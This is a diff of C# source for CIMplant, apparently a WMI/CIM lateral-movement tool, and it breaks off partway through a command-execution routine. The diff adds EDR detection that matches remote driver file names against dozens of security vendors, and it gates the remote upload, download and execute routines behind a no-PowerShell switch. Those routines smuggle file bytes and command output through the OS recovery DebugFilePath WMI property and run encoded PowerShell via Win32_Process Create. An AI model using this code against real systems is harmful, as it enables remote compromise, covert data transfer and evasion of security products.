@@ -268,6 +268,291 @@ namespace CIMplant
             return queryInstance;
         }
 
+        // Idea and some code thanks to Harley - https://github.com/harleyQu1nn/AggressorScripts/blob/master/EDR.cna
+        public object edr_query(Planter planter)
+        {
+            CimSession cimSession = planter.Connector.ConnectedCimSession;
+            bool activeEdr = false;
+
+            string fileQuery = @"SELECT * FROM CIM_DataFile WHERE Path = '\\windows\\System32\\drivers\\'";
+            IEnumerable<CimInstance> queryInstance = cimSession.QueryInstances(Namespace, "WQL", fileQuery);
+
+            foreach (CimInstance cimObject in queryInstance)
+            {
+                string fileName = Path.GetFileName(cimObject.CimInstanceProperties["Name"].Value.ToString());
+
+                switch (fileName)
+                {
+                    case "FeKern.sys":
+                    case "WFP_MRT.sys":
+                        Messenger.ErrorMessage("FireEye Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "eaw.sys":
+                        Messenger.ErrorMessage("Raytheon Cyber Solutions Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "rvsavd.sys":
+                        Messenger.ErrorMessage("CJSC Returnil Software Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "dgdmk.sys":
+                        Messenger.ErrorMessage("Verdasys Inc. Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "atrsdfw.sys":
+                        Messenger.ErrorMessage("Altiris (Symantec) Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "mbamwatchdog.sys":
+                        Messenger.ErrorMessage("Malwarebytes Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "edevmon.sys":
+                    case "ehdrv.sys":
+                        Messenger.ErrorMessage("ESET Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "SentinelMonitor.sys":
+                        Messenger.ErrorMessage("SentinelOne Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "edrsensor.sys":
+                    case "hbflt.sys":
+                    case "bdsvm.sys":
+                    case "gzflt.sys":
+                    case "bddevflt.sys":
+                    case "AVCKF.SYS":
+                    case "Atc.sys":
+                    case "AVC3.SYS":
+                    case "TRUFOS.SYS":
+                    case "BDSandBox.sys":
+                        Messenger.ErrorMessage("BitDefender Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "HexisFSMonitor.sys":
+                        Messenger.ErrorMessage("Hexis Cyber Solutions Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "CyOptics.sys":
+                    case "CyProtectDrv32.sys":
+                    case "CyProtectDrv64.sys":
+                        Messenger.ErrorMessage("Cylance Inc. Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "aswSP.sys":
+                        Messenger.ErrorMessage("Avast Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "mfeaskm.sys":
+                    case "mfencfilter.sys":
+                    case "epdrv.sys":
+                    case "mfencoas.sys":
+                    case "mfehidk.sys":
+                    case "swin.sys":
+                    case "hdlpflt.sys":
+                    case "mfprom.sys":
+                    case "MfeEEFF.sys":
+                        Messenger.ErrorMessage("McAfee Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "groundling32.sys":
+                    case "groundling64.sys":
+                        Messenger.ErrorMessage("Dell Secureworks Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "avgtpx86.sys":
+                    case "avgtpx64.sys":
+                        Messenger.ErrorMessage("AVG Technologies Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "pgpwdefs.sys":
+                    case "GEProtection.sys":
+                    case "diflt.sys":
+                    case "sysMon.sys":
+                    case "ssrfsf.sys":
+                    case "emxdrv2.sys":
+                    case "reghook.sys":
+                    case "spbbcdrv.sys":
+                    case "bhdrvx86.sys":
+                    case "bhdrvx64.sys":
+                    case "SISIPSFileFilter.sys":
+                    case "symevent.sys":
+                    case "vxfsrep.sys":
+                    case "VirtFile.sys":
+                    case "SymAFR.sys":
+                    case "symefasi.sys":
+                    case "symefa.sys":
+                    case "symefa64.sys":
+                    case "SymHsm.sys":
+                    case "evmf.sys":
+                    case "GEFCMP.sys":
+                    case "VFSEnc.sys":
+                    case "pgpfs.sys":
+                    case "fencry.sys":
+                    case "symrg.sys":
+                        Messenger.ErrorMessage("Symantec Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "SAFE-Agent.sys":
+                        Messenger.ErrorMessage("SAFE-Cyberdefense Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "CybKernelTracker.sys":
+                        Messenger.ErrorMessage("CyberArk Software Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "klifks.sys":
+                    case "klifaa.sys":
+                    case "Klifsm.sys":
+                        Messenger.ErrorMessage("Kaspersky Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "SAVOnAccess.sys":
+                    case "savonaccess.sys":
+                    case "sld.sys":
+                        Messenger.ErrorMessage("Sophos Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "ssfmonm.sys":
+                        Messenger.ErrorMessage("Webroot Software, Inc. Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "CarbonBlackK.sys":
+                    case "carbonblackk.sys":
+                    case "Parity.sys":
+                    case "cbk7.sys":
+                    case "cbstream.sys":
+                        Messenger.ErrorMessage("Carbon Black Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "CRExecPrev.sys":
+                        Messenger.ErrorMessage("Cybereason Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "im.sys":
+                    case "CSAgent.sys":
+                    case "CSBoot.sys":
+                    case "CSDeviceControl.sys":
+                    case "cspcm2.sys":
+                        Messenger.ErrorMessage("CrowdStrike Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "cfrmd.sys":
+                    case "cmdccav.sys":
+                    case "cmdguard.sys":
+                    case "CmdMnEfs.sys":
+                    case "MyDLPMF.sys":
+                        Messenger.ErrorMessage("Comodo Security Solutions Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "PSINPROC.SYS":
+                    case "PSINFILE.SYS":
+                    case "amfsm.sys":
+                    case "amm8660.sys":
+                    case "amm6460.sys":
+                        Messenger.ErrorMessage("Panda Security Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "fsgk.sys":
+                    case "fsatp.sys":
+                    case "fshs.sys":
+                        Messenger.ErrorMessage("F-Secure Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "esensor.sys":
+                        Messenger.ErrorMessage("Endgame Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "csacentr.sys":
+                    case "csaenh.sys":
+                    case "csareg.sys":
+                    case "csascr.sys":
+                    case "csaav.sys":
+                    case "csaam.sys":
+                        Messenger.ErrorMessage("Cisco Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "TMUMS.sys":
+                    case "hfileflt.sys":
+                    case "TMUMH.sys":
+                    case "AcDriver.sys":
+                    case "SakFile.sys":
+                    case "SakMFile.sys":
+                    case "fileflt.sys":
+                    case "TmEsFlt.sys":
+                    case "tmevtmgr.sys":
+                    case "TmFileEncDmk.sys":
+                        Messenger.ErrorMessage("Trend Micro Inc Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "epregflt.sys":
+                    case "medlpflt.sys":
+                    case "dsfa.sys":
+                    case "cposfw.sys":
+                        Messenger.ErrorMessage("Check Point Software Technologies Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "psepfilter.sys":
+                    case "cve.sys":
+                        Messenger.ErrorMessage("Absolute Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "brfilter.sys":
+                        Messenger.ErrorMessage("Bromium Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "LRAgentMF.sys":
+                        Messenger.ErrorMessage("LogRhythm Found!");
+                        activeEdr = true;
+                        break;
+
+                    case "libwamf.sys":
+                        Messenger.ErrorMessage("OPSWAT Inc Found!");
+                        activeEdr = true;
+                        break;
+                }
+            }
+
+            if (!activeEdr)
+                Console.WriteLine("No EDR vendors found, tread carefully");
+
+            return true;
+        }
+
 
         ///////////////////////////////////////           FILE OPERATIONS            /////////////////////////////////////////////////////////////////////
 
@@ -350,145 +635,152 @@ namespace CIMplant
                 return null;
             }
 
-            string originalWmiProperty = GetOsRecovery(cimSession);
-            bool wsman = true;
-            bool resetEnvSize = false;
-            string originalRemoteEnvSize = EnvelopeSize.GetMaxEnvelopeSize(cimSession);
-            string originalLocalEnvSize = EnvelopeSize.GetLocalMaxEnvelopeSize();
-
-            // Get the local maxEnvelopeSize. If it's not set (default) let's note that
-            originalRemoteEnvSize = originalRemoteEnvSize == "0" ? "500" : originalRemoteEnvSize;
-            originalLocalEnvSize = originalLocalEnvSize == "0" ? "500" : originalLocalEnvSize;
-            
-            Messenger.GoodMessage("[+] Downloading file: " + downloadPath + "\n");
-
-            if (wsman == true)
+            if (!planter.Commander.NoPS)
             {
-                int fileSize = GetFileSize(downloadPath, cimSession);
+                string originalWmiProperty = GetOsRecovery(cimSession);
+                bool wsman = true;
+                bool resetEnvSize = false;
+                string originalRemoteEnvSize = EnvelopeSize.GetMaxEnvelopeSize(cimSession);
+                string originalLocalEnvSize = EnvelopeSize.GetLocalMaxEnvelopeSize();
 
-                // We can modify this later easily to pass wsman if needed
-                using (PowerShell powershell = PowerShell.Create())
+                // Get the local maxEnvelopeSize. If it's not set (default) let's note that
+                originalRemoteEnvSize = originalRemoteEnvSize == "0" ? "500" : originalRemoteEnvSize;
+                originalLocalEnvSize = originalLocalEnvSize == "0" ? "500" : originalLocalEnvSize;
+
+                Messenger.GoodMessage("[+] Downloading file: " + downloadPath + "\n");
+
+                if (wsman == true)
+                {
+                    int fileSize = GetFileSize(downloadPath, cimSession);
+
+                    // We can modify this later easily to pass wsman if needed
+                    using (PowerShell powershell = PowerShell.Create())
+                    {
+                        try
+                        {
+                            powershell.Runspace = !string.IsNullOrEmpty(planter.Password?.ToString()) ? RunspaceCreate(planter) : RunspaceCreateLocal();
+
+                            if (fileSize / 1024 > 450)
+                            {
+                                resetEnvSize = true;
+                                Messenger.WarningMessage(
+                                    "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
+                                int envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
+                                EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
+                                EnvelopeSize.SetMaxEnvelopeSize(envSize.ToString(), cimSession);
+                            }
+
+                            string command1 = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath +
+                                              "'";
+                            const string command2 = @"$encdata = [Int[]][byte[]]$data -Join ','";
+                            const string command3 =
+                                @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
+
+                            if (powershell.Runspace.ConnectionInfo != null)
+                            {
+                                powershell.Commands.AddScript(command1, false);
+                                powershell.Commands.AddScript(command2, false);
+                                powershell.Commands.AddScript(command3, false);
+                                powershell.Invoke();
+
+
+                            }
+                            else
+                                wsman = false;
+                        }
+                        catch (PSRemotingTransportException)
+                        {
+                            wsman = false;
+                        }
+                    }
+                }
+
+                if (wsman == false)
+                {
+                    // WSMAN not enabled on the remote system, use another method
+
+                    // We need to check for the remote file size. If over 500KB (or 450 to be sure) let's raise the maxEnvelopeSizeKB
+                    int fileSize = GetFileSize(downloadPath, cimSession);
+
+                    if (fileSize / 1024 > 450)
+                    {
+                        resetEnvSize = true;
+                        int envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
+                        Messenger.WarningMessage(
+                            "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
+                        if (fileSize / 1024 > 250000)
+                        {
+                            EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
+                            EnvelopeSize.SetMaxEnvelopeSize("999999999",
+                                cimSession); // This is the largest value we can set, so not sure if this will work
+                        }
+                        else
+                        {
+                            EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
+                            EnvelopeSize.SetMaxEnvelopeSize("256000", cimSession);
+                        }
+                    }
+
+                    // Create the parameters and create the new process. Broken out to make it easier to follow what's up
+                    CimMethodParametersCollection cimParams = new CimMethodParametersCollection();
+
+                    string encodedCommand = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath +
+                                            "'; $encdata = [Int[]][byte[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
+                    var encodedCommandB64 =
+                        Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
+                    string fullCommand = "powershell -enc " + encodedCommandB64;
+
+                    cimParams.Add(CimMethodParameter.Create("CommandLine", fullCommand, CimFlags.In));
+
+                    // We only need the first instance
+                    cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
+                }
+
+                // Give it a second to write and check for changes to DebugFilePath
+                Thread.Sleep(1000);
+                Messenger.WarningMessage("\n[*] Checking for a modified DebugFilePath and grabbing the data. This may take a while if the file is large (USE WMI IF IT IS)\n");
+
+                //string[] fileOutput = CheckForFinishedDebugFilePath(originalWMIProperty, cimSession).Split(',');
+                string fileOutput = CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);
+
+                // We need to pause for a bit here for some reason
+                Thread.Sleep(5000);
+
+                //Create list for bytes
+                List<byte> outputList = new List<byte>();
+
+                //Convert from int (bytes) to byte
+                foreach (string integer in fileOutput.Split(','))
                 {
                     try
                     {
-                        powershell.Runspace = !string.IsNullOrEmpty(planter.Password?.ToString()) ? RunspaceCreate(planter) : RunspaceCreateLocal();
-
-                        if (fileSize / 1024 > 450)
-                        {
-                            resetEnvSize = true;
-                            Messenger.WarningMessage(
-                                "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
-                            int envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
-                            EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
-                            EnvelopeSize.SetMaxEnvelopeSize(envSize.ToString(), cimSession);
-                        }
-
-                        string command1 = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath +
-                                          "'";
-                        const string command2 = @"$encdata = [Int[]][byte[]]$data -Join ','";
-                        const string command3 =
-                            @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
-
-                        if (powershell.Runspace.ConnectionInfo != null)
-                        {
-                            powershell.Commands.AddScript(command1, false);
-                            powershell.Commands.AddScript(command2, false);
-                            powershell.Commands.AddScript(command3, false);
-                            powershell.Invoke();
-
-
-                        }
-                        else
-                            wsman = false;
+                        byte a = (byte)Convert.ToInt32(integer);
+                        outputList.Add(a);
                     }
-                    catch (PSRemotingTransportException)
+                    catch
                     {
-                        wsman = false;
+                        //pass
                     }
+                }
+
+                //Save to local dir if no directory specified
+                if (string.IsNullOrEmpty(writePath))
+                    writePath = Path.GetFileName(downloadPath);
+
+                File.WriteAllBytes(writePath, outputList.ToArray());
+
+                SetOsRecovery(cimSession, originalWmiProperty);
+
+                if (resetEnvSize)
+                {
+                    // Set the maxEnvelopeSizeKB back to the default val if we set it previously
+                    EnvelopeSize.SetLocalMaxEnvelopeSize(Convert.ToInt32(originalLocalEnvSize));
+                    EnvelopeSize.SetMaxEnvelopeSize(originalRemoteEnvSize, cimSession);
                 }
             }
-
-            if (wsman == false)
+            else
             {
-                // WSMAN not enabled on the remote system, use another method
-
-                // We need to check for the remote file size. If over 500KB (or 450 to be sure) let's raise the maxEnvelopeSizeKB
-                int fileSize = GetFileSize(downloadPath, cimSession);
-
-                if (fileSize / 1024 > 450)
-                {
-                    resetEnvSize = true;
-                    int envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
-                    Messenger.WarningMessage(
-                        "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
-                    if (fileSize / 1024 > 250000)
-                    {
-                        EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
-                        EnvelopeSize.SetMaxEnvelopeSize("999999999",
-                            cimSession); // This is the largest value we can set, so not sure if this will work
-                    }
-                    else
-                    {
-                        EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
-                        EnvelopeSize.SetMaxEnvelopeSize("256000", cimSession);
-                    }
-                }
-
-                // Create the parameters and create the new process. Broken out to make it easier to follow what's up
-                CimMethodParametersCollection cimParams = new CimMethodParametersCollection();
-
-                string encodedCommand = "$data = Get-Content -Encoding byte -ReadCount 0 -Path '" + downloadPath +
-                                        "'; $encdata = [Int[]][byte[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
-                var encodedCommandB64 =
-                    Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
-                string fullCommand = "powershell -enc " + encodedCommandB64;
-
-                cimParams.Add(CimMethodParameter.Create("CommandLine", fullCommand, CimFlags.In));
-
-                // We only need the first instance
-                cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
-            }
-
-            // Give it a second to write and check for changes to DebugFilePath
-            Thread.Sleep(1000);
-            Messenger.WarningMessage("\n[*] Checking for a modified DebugFilePath and grabbing the data. This may take a while if the file is large (USE WMI IF IT IS)\n");
-
-            //string[] fileOutput = CheckForFinishedDebugFilePath(originalWMIProperty, cimSession).Split(',');
-            string fileOutput = CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);
-
-            // We need to pause for a bit here for some reason
-            Thread.Sleep(5000);
-
-            //Create list for bytes
-            List<byte> outputList = new List<byte>();
-
-            //Convert from int (bytes) to byte
-            foreach (string integer in fileOutput.Split(','))
-            {
-                try
-                {
-                    byte a = (byte)Convert.ToInt32(integer);
-                    outputList.Add(a);
-                }
-                catch
-                {
-                    //pass
-                }
-            }
-
-            //Save to local dir if no directory specified
-            if (string.IsNullOrEmpty(writePath))
-                writePath = Path.GetFileName(downloadPath);
-
-            File.WriteAllBytes(writePath, outputList.ToArray());
-
-            SetOsRecovery(cimSession, originalWmiProperty);
-
-            if (resetEnvSize)
-            {
-                // Set the maxEnvelopeSizeKB back to the default val if we set it previously
-                EnvelopeSize.SetLocalMaxEnvelopeSize(Convert.ToInt32(originalLocalEnvSize));
-                EnvelopeSize.SetMaxEnvelopeSize(originalRemoteEnvSize, cimSession);
+                Messenger.WarningMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
             }
 
             return true;
@@ -604,121 +896,128 @@ namespace CIMplant
                 return null;
             }
 
-            string originalWmiProperty = GetOsRecovery(cimSession);
-            bool wsman = true;
-            bool resetEnvSize = false;
-            int envSize = 500;
-
-            Messenger.GoodMessage("[+] Uploading file: " + uploadFile + " to " + writePath);
-            Messenger.GoodMessage("--------------------------------------------------------------------\n");
-
-            // We need to check for the remote file size. If over 500KB (or 450 to be sure) let's raise the maxEnvelopeSizeKB
-            int fileSize = (int) new FileInfo(uploadFile).Length; //Value in KB
-
-            if (fileSize / 1024 > 450)
+            if (!planter.Commander.NoPS)
             {
-                resetEnvSize = true;
-                envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
+                string originalWmiProperty = GetOsRecovery(cimSession);
+                bool wsman = true;
+                bool resetEnvSize = false;
+                int envSize = 500;
+
+                Messenger.GoodMessage("[+] Uploading file: " + uploadFile + " to " + writePath);
+                Messenger.GoodMessage("--------------------------------------------------------------------\n");
+
+                // We need to check for the remote file size. If over 500KB (or 450 to be sure) let's raise the maxEnvelopeSizeKB
+                int fileSize = (int)new FileInfo(uploadFile).Length; //Value in KB
+
+                if (fileSize / 1024 > 450)
+                {
+                    resetEnvSize = true;
+                    envSize = fileSize / 1024 > 250000 ? 999999999 : 256000;
+                    Messenger.WarningMessage(
+                        "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
+                    if (fileSize / 1024 > 250000)
+                    {
+                        EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
+                        EnvelopeSize.SetMaxEnvelopeSize("999999999",
+                            cimSession); // This is the largest value we can set, so not sure if this will work
+                    }
+                    else
+                    {
+                        EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
+                        EnvelopeSize.SetMaxEnvelopeSize("256000", cimSession);
+                    }
+                }
+
+                List<int> intList = new List<int>();
+                byte[] uploadFileBytes = File.ReadAllBytes(uploadFile);
+
+                //Convert from byte to int (bytes)
+                foreach (byte uploadByte in uploadFileBytes)
+                {
+                    int a = uploadByte;
+                    intList.Add(a);
+                }
+
+                SetOsRecovery(cimSession, string.Join(",", intList));
+
+                // Give it a second to write and check for changes to DebugFilePath
                 Messenger.WarningMessage(
-                    "[*] Warning: The file size is greater than 450 KB, setting the maxEnvelopeSizeKB higher...");
-                if (fileSize / 1024 > 250000)
-                {
-                    EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
-                    EnvelopeSize.SetMaxEnvelopeSize("999999999",
-                        cimSession); // This is the largest value we can set, so not sure if this will work
-                }
-                else
-                {
-                    EnvelopeSize.SetLocalMaxEnvelopeSize(envSize);
-                    EnvelopeSize.SetMaxEnvelopeSize("256000", cimSession);
-                }
-            }
-
-            List<int> intList = new List<int>();
-            byte[] uploadFileBytes = File.ReadAllBytes(uploadFile);
-
-            //Convert from byte to int (bytes)
-            foreach (byte uploadByte in uploadFileBytes)
-            {
-                int a = uploadByte;
-                intList.Add(a);
-            }
-
-            SetOsRecovery(cimSession, string.Join(",", intList));
-
-            // Give it a second to write and check for changes to DebugFilePath
-            Messenger.WarningMessage(
-                "\n[*] Checking for a modified DebugFilePath and grabbing the data. This may take a while if the file is large (USE WMI IF IT IS)\n");
-            System.Threading.Thread.Sleep(1000);
-            CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);
-
-            if (wsman == true)
-            {
-                // We can modify this later easily to pass wsman if needed
-                using (PowerShell powershell = PowerShell.Create())
-                {
-                    try
-                    {
-                        if (!string.IsNullOrEmpty(planter.Password?.ToString()))
-                            powershell.Runspace = RunspaceCreate(planter);
-                        else
-                            powershell.Runspace = RunspaceCreateLocal();
-
-                        const string command1 =
-                            @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath";
-                        const string command2 = @"$decode = [byte[]][int[]]$encdata.Split(',') -Join ' '";
-                        string command3 =
-                            @"[byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
-                            writePath + "' -Value $decoded";
-
-                        if (powershell.Runspace.ConnectionInfo != null)
-                        {
-                            powershell.Commands.AddScript(command1, false);
-                            powershell.Commands.AddScript(command2, false);
-                            powershell.Commands.AddScript(command3, false);
-                            powershell.Invoke();
-                        }
-                        else
-                            wsman = false;
-                    }
-                    catch (PSRemotingTransportException)
-                    {
-                        wsman = false;
-                    }
-                }
-            }
-
-            if (wsman == false)
-            {
-                // WSMAN not enabled on the remote system, use another method
-
-                // Create the parameters and create the new process. Broken out to make it easier to follow what's up
-                CimMethodParametersCollection cimParams = new CimMethodParametersCollection();
-
-                string encodedCommand =
-                    "$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath; $decode = [byte[]][int[]]$encdata.Split(',') -Join ' '; [byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
-                    writePath + "' -Value $decoded";
-                var encodedCommandB64 =
-                    Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
-                string fullCommand = "powershell -enc " + encodedCommandB64;
-
-                cimParams.Add(CimMethodParameter.Create("CommandLine", fullCommand, CimFlags.In));
-
-                // We only need the first instance
-                cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
-
-                // Give it a second to write
+                    "\n[*] Checking for a modified DebugFilePath and grabbing the data. This may take a while if the file is large (USE WMI IF IT IS)\n");
                 System.Threading.Thread.Sleep(1000);
+                CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);
+
+                if (wsman == true)
+                {
+                    // We can modify this later easily to pass wsman if needed
+                    using (PowerShell powershell = PowerShell.Create())
+                    {
+                        try
+                        {
+                            if (!string.IsNullOrEmpty(planter.Password?.ToString()))
+                                powershell.Runspace = RunspaceCreate(planter);
+                            else
+                                powershell.Runspace = RunspaceCreateLocal();
+
+                            const string command1 =
+                                @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath";
+                            const string command2 = @"$decode = [byte[]][int[]]$encdata.Split(',') -Join ' '";
+                            string command3 =
+                                @"[byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
+                                writePath + "' -Value $decoded";
+
+                            if (powershell.Runspace.ConnectionInfo != null)
+                            {
+                                powershell.Commands.AddScript(command1, false);
+                                powershell.Commands.AddScript(command2, false);
+                                powershell.Commands.AddScript(command3, false);
+                                powershell.Invoke();
+                            }
+                            else
+                                wsman = false;
+                        }
+                        catch (PSRemotingTransportException)
+                        {
+                            wsman = false;
+                        }
+                    }
+                }
+
+                if (wsman == false)
+                {
+                    // WSMAN not enabled on the remote system, use another method
+
+                    // Create the parameters and create the new process. Broken out to make it easier to follow what's up
+                    CimMethodParametersCollection cimParams = new CimMethodParametersCollection();
+
+                    string encodedCommand =
+                        "$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath; $decode = [byte[]][int[]]$encdata.Split(',') -Join ' '; [byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
+                        writePath + "' -Value $decoded";
+                    var encodedCommandB64 =
+                        Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
+                    string fullCommand = "powershell -enc " + encodedCommandB64;
+
+                    cimParams.Add(CimMethodParameter.Create("CommandLine", fullCommand, CimFlags.In));
+
+                    // We only need the first instance
+                    cimSession.InvokeMethod(new CimInstance("Win32_Process", Namespace), "Create", cimParams);
+
+                    // Give it a second to write
+                    System.Threading.Thread.Sleep(1000);
+                }
+
+                // Set OSRecovery back to normal pls
+                SetOsRecovery(cimSession, originalWmiProperty);
+
+                if (resetEnvSize)
+                {
+                    // Set the maxEnvelopeSizeKB back to the default val if we set it previously
+                    EnvelopeSize.SetLocalMaxEnvelopeSize(500);
+                    EnvelopeSize.SetMaxEnvelopeSize("500", cimSession);
+                }
             }
-
-            // Set OSRecovery back to normal pls
-            SetOsRecovery(cimSession, originalWmiProperty);
-
-            if (resetEnvSize)
+            else
             {
-                // Set the maxEnvelopeSizeKB back to the default val if we set it previously
-                EnvelopeSize.SetLocalMaxEnvelopeSize(500);
-                EnvelopeSize.SetMaxEnvelopeSize("500", cimSession);
+                Messenger.WarningMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
             }
 
             return true;
@@ -746,173 +1045,197 @@ namespace CIMplant
             Messenger.GoodMessage("[+] Executing command: " + planter.Commander.Execute);
             Messenger.GoodMessage("--------------------------------------------------------\n");
 
-            if (wsman)
+
+            if (!planter.Commander.NoPS)
             {
-                // We can modify this later easily to pass wsman if needed
-                using (PowerShell powershell = PowerShell.Create())
+                if (wsman)
                 {
-                    try
+                    // We can modify this later easily to pass wsman if needed
+                    using (PowerShell powershell = PowerShell.Create())
                     {
-                        if (!string.IsNullOrEmpty(planter.System?.ToString()))
-                            powershell.Runspace = RunspaceCreate(planter);
-                        else
+                        try
                         {
-                            powershell.Runspace = RunspaceCreateLocal();
-                            powershell.AddCommand(command);
-                            Collection<PSObject> result = powershell.Invoke();
-                            foreach (PSObject a in result)
+                            if (!string.IsNullOrEmpty(planter.System?.ToString()))
+                                powershell.Runspace = RunspaceCreate(planter);
+                            else
                             {
-                                Console.WriteLine(a);
-                            }
+                                powershell.Runspace = RunspaceCreateLocal();
+                                powershell.AddCommand(command);
+                                Collection<PSObject> result = powershell.Invoke();
+                                foreach (PSObject a in result)
+                                {
+                                    Console.WriteLine(a);
+                                }
 
-                            return true;
+                                return true;
+                            }
                         }
-                    }
-                    catch (PSRemotingTransportException)
-                    {
-                        wsman = false;
-                        goto GetOut; // Do this so we're not doing below work when we don't need to
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine(e);
-                    }
-
-                    if (powershell.Runspace.ConnectionInfo != null)
-                    {
-                        string command1 = "$data = (" + command + " | Out-String).Trim()";
-                        const string command2 = @"$encdata = [Int[]][Char[]]$data -Join ','";
-                        const string command3 =
-                            @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
-
-                        powershell.Commands.AddScript(command1, false);
-                        powershell.Commands.AddScript(command2, false);
-                        powershell.Commands.AddScript(command3, false);
-
-                        // If running powershell.exe let's run it and not worry about the output otherwise it will hang for very long time
-                        if (noDebugCheck)
+                        catch (PSRemotingTransportException)
                         {
-                            // start the timer and get a timeout
-                            DateTime startTime = DateTime.Now;
-                            IAsyncResult asyncPs = powershell.BeginInvoke();
+                            wsman = false;
+                            goto GetOut; // Do this so we're not doing below work when we don't need to
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine(e);
+                        }
 
-                            while (asyncPs.IsCompleted == false)
+                        if (powershell.Runspace.ConnectionInfo != null)
+                        {
+                            string command1 = "$data = (" + command + " | Out-String).Trim()";
+                            const string command2 = @"$encdata = [Int[]][Char[]]$data -Join ','";
+                            const string command3 =
+                                @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
+
+                            powershell.Commands.AddScript(command1, false);
+                            powershell.Commands.AddScript(command2, false);
+                            powershell.Commands.AddScript(command3, false);
+
+                            // If running powershell.exe let's run it and not worry about the output otherwise it will hang for very long time
+                            if (noDebugCheck)
                             {
-                                //Console.WriteLine("Waiting for pipeline to finish...");
-                                Thread.Sleep(5000);
+                                // start the timer and get a timeout
+                                DateTime startTime = DateTime.Now;
+                                IAsyncResult asyncPs = powershell.BeginInvoke();
 
-                                // Check on our timeout here
-                                TimeSpan elasped = DateTime.Now.Subtract(startTime);
-                                if (elasped > timeout)
-                                    break;
+                                while (asyncPs.IsCompleted == false)
+                                {
